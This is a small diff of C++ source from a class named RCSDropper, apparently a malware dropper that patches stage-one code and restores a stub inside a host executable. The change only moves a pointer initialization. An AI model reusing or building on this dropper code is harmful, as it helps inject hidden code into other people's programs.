@@ -50,7 +50,7 @@ void RCSDropper::patchStage1(char* ptr, DWORD VA, DWORD jumpToVA)
 // XXX need of calling for size of stub makes restoreStub messy ... refactor!!
 std::size_t RCSDropper::restoreStub( DWORD currentVA )
 {
-	unsigned char* restore = NULL;
+	unsigned char* restore = ptr_ ( offset_.restore );
 	DropperHeader* h = NULL;
 	DWORD headerVA, dropperVA, stage1VA;
 
@@ -59,7 +59,6 @@ std::size_t RCSDropper::restoreStub( DWORD currentVA )
 		dropperVA = 0xFFFFFFFF;
 		stage1VA = 0xFFFFFFFF;
 	} else {
-		restore = ptr_ ( offset_.restore );
 		h = header();
 		headerVA = currentVA + offset_.header;
 		dropperVA = headerVA + sizeof(DropperHeader);
